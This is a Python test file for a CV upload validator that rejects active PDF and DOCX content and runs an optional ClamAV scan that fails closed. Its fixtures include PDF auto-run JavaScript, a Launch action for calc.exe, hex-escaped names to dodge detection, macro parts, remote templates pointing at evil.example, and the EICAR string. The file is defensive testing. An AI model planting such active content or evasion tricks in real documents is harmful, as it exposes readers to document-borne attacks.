"""Active content in uploads is refused, and the optional antivirus scan fails closed. All fixtures are built here."""
import io
import os
import socket
import struct
import threading
import zipfile
import zlib

import pytest

from security.file_validator import FileRejected, raw_active_names, validate_upload
from security.malware_scan import ClamdScanner, ScanUnavailable, scanner_from_env
from services.screener.tests.pdf_fixtures import minimal_pdf

LINES = ["Junior Developer", "EXPERIENCE", "Developer, Fictional Co (2019 - 2025)"]
JS_ACTION = b"<< /S /JavaScript /JS (app.alert(1)) >>"


def pdf(**kwargs) -> bytes:
    return minimal_pdf(LINES, **kwargs)


@pytest.mark.parametrize("data", [
    pdf(catalog_extra=b"/OpenAction 6 0 R ", extra_objects=[JS_ACTION]),
    pdf(catalog_extra=b"/AA << /O 6 0 R >> ", extra_objects=[b"<< /S /Launch /F (calc.exe) >>"]),
    pdf(catalog_extra=b"/Names << /EmbeddedFiles 6 0 R >> ", extra_objects=[b"<< /Names [] >>"]),
    pdf(catalog_extra=b"/AcroForm << /XFA 6 0 R >> ", extra_objects=[b"<< >>"]),
    pdf(catalog_extra=b"/OpenAction 6 0 R ", extra_objects=[b"<< /S /J#61vaScript /J#53 (app.alert(1)) >>"]),
    pdf(catalog_extra=b"/Names << /JavaScript 6 0 R >> ", extra_objects=[b"<< /Names [] >>"]),
    pdf(extra_objects=[b"<< /Type /Annot /Subtype /RichMedia >>"]),
], ids=["open-action-js", "auto-launch", "embedded-files", "xfa", "hex-escaped-js", "names-js", "rich-media"])
def test_active_pdf_content_is_refused(data):
    with pytest.raises(FileRejected, match="active_pdf_content"):
        validate_upload("cv.pdf", data)


def test_hex_escapes_are_decoded():
    assert raw_active_names(b"%PDF-1.4 << /S /J#61vaScript /J#53 (x) /O#70enAction 1 0 R >>") == {
        "JavaScript", "JS", "OpenAction"}


def test_names_hidden_in_a_compressed_stream_are_found_by_the_parser():
    # The raw scan skips stream bytes; the parsed walk still reads every object.
    from pdfminer.pdfdocument import PDFDocument
    from pdfminer.pdfparser import PDFParser

    from security.file_validator import parsed_active_names

    data = pdf(catalog_extra=b"/OpenAction 6 0 R ", extra_objects=[JS_ACTION])
    document = PDFDocument(PDFParser(io.BytesIO(data)))
    assert {"OpenAction", "JavaScript", "JS"} <= parsed_active_names(document)


def test_clean_pdf_passes_and_random_stream_bytes_do_not_trip_the_scan():
    assert validate_upload("cv.pdf", pdf()).kind == "pdf"
    noise = zlib.compress(b"x") + b"/JS/AA/Launch" * 20  # active-looking bytes inside a stream body only
    data = pdf(extra_objects=[b"<< /Length " + str(len(noise)).encode() + b" >>\nstream\n" + noise + b"\nendstream"])
    assert validate_upload("cv.pdf", data).kind == "pdf"


def docx(extra: dict[str, bytes] | None = None, rels: str = "", content_types: bytes = b"") -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("[Content_Types].xml", content_types or b'<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>')
        archive.writestr("word/document.xml", '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Junior Developer with Python experience</w:t></w:r></w:p></w:body></w:document>')
        if rels:
            archive.writestr("word/_rels/document.xml.rels",
                             f'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">{rels}</Relationships>')
        for name, data in (extra or {}).items():
            archive.writestr(name, data)
    return buffer.getvalue()


REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"


@pytest.mark.parametrize("data", [
    docx({"word/vbaProject.bin": b"macro"}),
    docx({"word/embeddings/oleObject1.bin": b"ole"}),
    docx({"word/activeX/activeX1.xml": b"<x/>"}),
    docx(content_types=b'<Types><Override ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>'),
    docx(rels=f'<Relationship Id="r1" Type="{REL}/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/>'),
    docx(rels=f'<Relationship Id="r2" Type="{REL}/frame" Target="http://evil.example/x" TargetMode="External"/>'),
], ids=["macro", "embedded-object", "activex", "macro-content-type", "remote-template", "remote-frame"])
def test_active_docx_content_is_refused(data):
    with pytest.raises(FileRejected, match="active_docx_content"):
        validate_upload("cv.docx", data)


def test_docx_with_an_ordinary_hyperlink_passes():
    data = docx(rels=f'<Relationship Id="r1" Type="{REL}/hyperlink" Target="https://www.linkedin.com/in/x" TargetMode="External"/>')
    assert validate_upload("cv.docx", data).kind == "docx"


class FakeScanner:
    def __init__(self, result):
        self.result = result

    def is_infected(self, data):
        if isinstance(self.result, Exception):
            raise self.result
        return self.result


def test_scanner_verdicts():
    assert validate_upload("cv.pdf", pdf(), scanner=FakeScanner(False)).kind == "pdf"
    with pytest.raises(FileRejected, match="malware_found"):
        validate_upload("cv.pdf", pdf(), scanner=FakeScanner(True))
    with pytest.raises(FileRejected, match="scan_unavailable"):
        validate_upload("cv.pdf", pdf(), scanner=FakeScanner(ScanUnavailable("down")))


def test_scanning_is_off_unless_enabled(monkeypatch):
    monkeypatch.delenv("CLAMAV_ENABLED", raising=False)
    assert scanner_from_env() is None
    monkeypatch.setenv("CLAMAV_ENABLED", "true")
    monkeypatch.setenv("CLAMAV_PORT", "1")
    assert isinstance(scanner_from_env(), ClamdScanner)


def test_unreachable_clamd_fails_closed(monkeypatch):
    with socket.socket() as probe:  # a port nothing listens on
        probe.bind(("127.0.0.1", 0))
        port = probe.getsockname()[1]
    monkeypatch.setenv("CLAMAV_ENABLED", "true")
    monkeypatch.setenv("CLAMAV_PORT", str(port))
    with pytest.raises(FileRejected, match="scan_unavailable"):
        validate_upload("cv.pdf", pdf())


def fake_clamd(answer: bytes):
    """A loopback clamd that reads one INSTREAM upload and replies with `answer`."""
    server = socket.socket()
    server.bind(("127.0.0.1", 0))
    server.listen(1)
    received = {}

    def serve():
        connection, _ = server.accept()
        with connection:
            command = connection.recv(10)
            body = b""
            while True:
                size = struct.unpack(">I", connection.recv(4))[0]
                if size == 0:
                    break
                while len(body) < size + len(received.get("body", b"")):
                    body += connection.recv(size)
                received["body"] = body
            received["command"] = command
            connection.sendall(answer + b"\0")
        server.close()

    threading.Thread(target=serve, daemon=True).start()
    return server.getsockname()[1], received


@pytest.mark.parametrize(("answer", "infected"), [(b"stream: OK", False), (b"stream: Eicar-Test-Signature FOUND", True)])
def test_clamd_protocol(answer, infected):
    port, received = fake_clamd(answer)
    assert ClamdScanner(port=port, timeout=5).is_infected(b"hello world") is infected
    assert received["command"] == b"zINSTREAM\0" and received["body"] == b"hello world"


def test_eicar_against_a_real_clamd():
    """Only runs when a local ClamAV is set up (see docs/security.md)."""
    if os.getenv("CLAMAV_TEST") != "1":
        pytest.skip("set CLAMAV_TEST=1 with clamd on 127.0.0.1:3310")
    eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    assert ClamdScanner().is_infected(eicar)
